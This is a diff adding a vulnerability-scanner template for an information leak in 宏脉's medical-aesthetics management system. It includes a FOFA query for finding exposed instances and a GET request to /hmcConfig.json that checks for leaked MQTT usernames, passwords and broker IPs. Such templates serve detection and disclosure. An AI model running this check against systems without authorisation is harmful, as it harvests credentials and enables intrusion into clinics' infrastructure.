@@ -1,0 +1,24 @@
+id: hmc-hmcconfig-infoleak
+
+info:
+  name: 宏脉信息技术hmcConfig存在信息泄露漏洞
+  author: 熊猫也是猫
+  severity: high
+  verified: true
+  description: |-
+    宏脉信息技术的医美行业管理系统存在hmcConfig存在信息泄露漏洞
+    fofa: title="宏脉医美行业管理系统" || body="宏脉医疗机构管理系统"
+  tags: hmc,disclosure,infoleak
+  created: 2026/03/17
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /hmcConfig.json
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"MQTT_USERNAME":') &&
+      response.body.bcontains(b'"MQTT_PASSWORD":') &&
+      response.body.bcontains(b'"MQTT_IP":')
+expression: r0()
